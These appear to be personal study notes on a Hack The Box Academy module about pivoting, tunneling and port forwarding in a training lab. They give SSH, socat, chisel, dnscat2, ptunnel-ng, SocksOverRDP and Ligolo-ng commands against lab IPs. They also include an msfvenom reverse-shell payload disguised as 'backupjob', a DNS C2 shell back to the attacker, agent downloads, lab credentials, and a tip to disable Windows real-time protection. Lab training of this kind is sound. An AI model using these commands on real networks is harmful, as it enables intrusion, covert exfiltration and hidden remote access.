## Dynamic Port Forwarding with SSH and SOCKS
![](https://academy.hackthebox.com/storage/modules/158/11.png)

The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port `1234` and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port `3306`. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.

#### Executing the Local Port Forward

```shell-session
Poiint@htb[/htb]$ ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
#Binds mysql:3306 on victim host to our localhost:1234
```

Confirming Port Forward with Netstat

```shell-session
Poiint@htb[/htb]$ netstat -antp | grep 1234
```

Forwarding Multiple Ports

```shell-session
Poiint@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```


#### Enabling Dynamic Port Forwarding with SSH

```shell-session
Poiint@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```

Checking /etc/proxychains.conf

```shell-session
Poiint@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Now by using proxychains, we can send all the data to port 9050 that is connected to the victim machine. By doing this we can access the internal network by using victim as a pivot.
SSH specified -D port and proxychains must coincide in order to work.

Using Nmap with Proxychains

```shell-session
Poiint@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
```

With proxychains we can use everything, msfconsole, smbclient, ecc...



## Remote/Reverse Port Forwarding with SSH

`But what happens if we try to gain a reverse shell?`

The `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).

Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

Using SSH -R

```shell-session
Poiint@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Meterpreter Tunnelling & Port Forwarding

Creating Payload for Ubuntu Pivot Host

```shell-session
Poiint@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Configuring & Starting the multi/handler

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Executing the Payload on the Pivot Host

```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

Meterpreter Session Establishment

```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

#### Ping Sweep

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Much likely as proxychains, we can start a SOCKS4/5 proxy in metasploit

Configuring MSF's SOCKS Proxy

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```

Confirming Proxy Server is Running

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

We can still add a line to proxychains, because other tools (nmap, ecc...) won't work with the proxy in metasploit. 

Creating Routes with AutoRoute

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

Creating Routes with AutoRoute (DEPRECATED).

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

Listing Active Routes with AutoRoute

```shell-session
meterpreter > run autoroute -p
```

### Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

Portfwd options

```shell-session
meterpreter > help portfwd
```

Creating Local TCP Relay

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Connecting to Windows Target through localhost

```shell-session
Poiint@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Netstat Output

```shell-session
Poiint@htb[/htb]$ netstat -antp
```

We can do the same process to port forward a port that we will be using to start a listener for a reverse shell.
## Socat Redirection with a Reverse Shell

Starting Socat Listener

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

We can create a payload like we did in the previous module, by using the socat listener.
## Socat Redirection with a Bind Shell
![](https://academy.hackthebox.com/storage/modules/158/55.png)
We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

Starting Socat Bind Shell Listener

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

NB: this socat listener must be started on the VICTIM (pivoting) machine!
The procedure is the same as before, create payload with msfvenom, start a listener in our attacking machine and execute the payload in the internal network.
## SSH for Windows: plink.exe
![](https://academy.hackthebox.com/storage/modules/158/66.png)

The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

Using Plink.exe

```cmd-session
plink -D 9050 ubuntu@10.129.15.50
```

Another Windows-based tool called [Proxifier](https://www.proxifier.com) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.![](https://academy.hackthebox.com/storage/modules/158/reverse_shell_9.png)


## SSH Pivoting with Sshuttle

To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

Running sshuttle

```shell-session
Poiint@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host (that's why i think we must run it as sudo).
We can now use nmap, ecc... withouth the use of proxychains

## Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

NB: we need python2.7

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

Running server.py from the Attack Host

```shell-session
Poiint@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transfering rpivot to the Target

```shell-session
Poiint@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Running client.py from Pivot Target

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

Confirming Connection is Established

```shell-session
New connection from host 10.129.202.64, source port 35226
```

Browsing to the Target Webserver using Proxychains

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

This method didn't work in my Kali. Used SSH port forwarding to resolve the question. I guess because it's an old tool.

## Port Forwarding with Windows Netsh
[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:
- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`
![](https://academy.hackthebox.com/storage/modules/158/88.png)

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

Using Netsh.exe to Port Forward

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Verifying Port Forward

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.


## DNS Tunneling with Dndscat2
[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

Cloning dnscat2 and Setting Up the Server (ALREADY DID ON MY KALI, no need to re-clone)

```shell-session
Poiint@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
bundle install
```

Starting the dnscat2 server

```shell-session
Poiint@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

#This will print a secret, we will need it after!!!
```


After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

importing dnscat2.ps1

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

Importing dnscat2.ps1

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

Confirming Session Establishment

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

Interacting with the Established Session

```shell-session
dnscat2> window -i 1
```

This method is really slow but it's good for evasion. 
## SOCKS5 Tunneling with Chisel
[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

Cloning Chisel

```shell-session
Poiint@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

Building the Chisel Binary

```shell-session
Poiint@htb[/htb]$ cd chisel
go build
```

Transferring Chisel Binary to Pivot Host

```shell-session
Poiint@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```

Running the Chisel Server on the Pivot Host

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

Connecting to the Chisel Server

```shell-session
Poiint@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```

We also need proxychains settled. Once connected the client will specify a port that it utilizes, so we need to add that port to proxychains. Also if we use --socks5 in the server we need to specify socks5 and not socks4 on proxychains.

We can also use chisel to a reverse pivot
When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option `--reverse`.

Starting the Chisel Server on our Attack Host

```shell-session
Poiint@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

Connecting the Chisel Client to our Attack Host

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

Editing & Confirming proxychains.conf

```shell-session
Poiint@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


## ICMP Tunneling with Socks


Starting the ptunnel-ng Server on the Target Host (we need to transfer it)

```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
#Running as sudo? Not good...
```

Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

Connecting to ptunnel-ng Server from Attack Host

```shell-session
Poiint@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

Tunneling an SSH connection through an ICMP Tunnel

```shell-session
Poiint@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

Enabling Dynamic Port Forwarding over SSH

```shell-session
Poiint@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```


## RDP and SOCKS Tunneling with SocksOverRDP
There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.

We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
    
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
    

- We can look for `ProxifierPE.zip`

We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

Loading SocksOverRDP.dll using regsvr32.exe

```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
#Disable Real Time Protection if windows whines
```

Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.![](https://academy.hackthebox.com/storage/modules/158/pivotingtoDC.png)

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

Confirming the SOCKS Listener is Started

```cmd-session
C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
```
![](https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif)

With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the `Experience` tab in mstsc.exe and set `Performance` to `Modem`.![](https://academy.hackthebox.com/storage/modules/158/rdpexpen.png)


## Ligolo-NG (<3)
I've come across this tool thanks to CPTS discord chat. Basically this tools creates tunnels in order to communicate. Here some resources:
+ [Ligolo github](https://github.com/sysdream/ligolo)
+ [Good ligolo tutorial](https://4pfsec.com/ligolo)
+ [Good yt video on ligolo](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi-l-WnlbmAAxXmQ_EDHd7bBJQQtwJ6BAgVEAI&url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DDM1B8S80EvQ&usg=AOvVaw3uesxYIA5kQKKUA42ghoxm&opi=89978449)

Let's get started!
We have two entities, the proxy and the agents. The proxy usually runs in the C2 (command and control) / attacking machine. We can run the proxy like this:

``` bash
./proxy -selfcert
```

Once we compromise a machine, we can copy the [agent](https://github.com/nicocha30/ligolo-ng/releases) and start it like this:

``` bash
./agent -connect 10.10.15.146:11601 -ignore-cert
```

The port 11601 is default and can be seen once started the proxy.
After the agent is executed, we should see a message pop up in the proxy saying "agent joined ...". This means the agent connected succesfully, but in order to communicate with the internal network, we need to add routes:

```
sudo ip route add x.x.x.x/24 dev ligolo #Look for interfaces with i(p/f)config
#Check routes with 'ip route'
```

Finally, we need to select the session (in this moment it's only 1), and type "start".
Once done, that's it! We can access the internal network. This tool becomes excellent with double pivoting (and so on...)
In order to make the internal network communicate with us, we can add a listener in the pivoting machine from our proxy

``` bash
[Agent : machine@dmz01] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601  --tcp
```
This will add a listener in the pivoting machine (0.0.0.0, accepting requests from all the interfaces) to our localhost (127.0.0.1) in the default 11601 port. We can check listeners with

``` bash
[Agent : machine@dmz01] >> listener_list
```

Now, from the internal host, we need to run the agent. There are some ways to do it, but we can also use ligolo to do it smoother! We can add another listener that will be utilized to transfer files:

``` bash
[Agent : machine@dmz01] >> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

Now we can start an http server in our attacking machine:

```
Poiint@htb[/htb]$: sudo python3 -m http.server 80
```

Now from the internal host, we can download the agent by specifying the address of the pivot machine. The pivot machine, thanks to ligolo, will send all the data to our localhost on the port specified. If the internal host is a windows machine:

``` powershell
PS C:\users\vfrank> Invoke-WebRequest -Uri "http://<IPofPivot>:8080/agent.exe" 
-OutFile 'C:\users\vfrank\agent.exe' "
```

and, like before, we start the agent:

``` powershell
PS C:\users\vfrank> .\agent.exe -connect <IPofPIVOT>:11601 --ignore-cert
```

If we did all correctly, we will see that a new agent joined the proxy. Now we can add all the routes that can be seen from the new agent, select the new session and start a new tunnel. If we want to further pivot, we can add a listener in the proxy:

``` bash
[Agent : machine@dc01] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 
--tcp
```

we can also add another listener for downloading files, i like to do it. Basically we have two listeners, one for adding agents and one for downloading. By re-iterating the process we can do double/triple/quadruple pivoting and so on.
You can use the skill assessmnet lab to practice the process/methodology.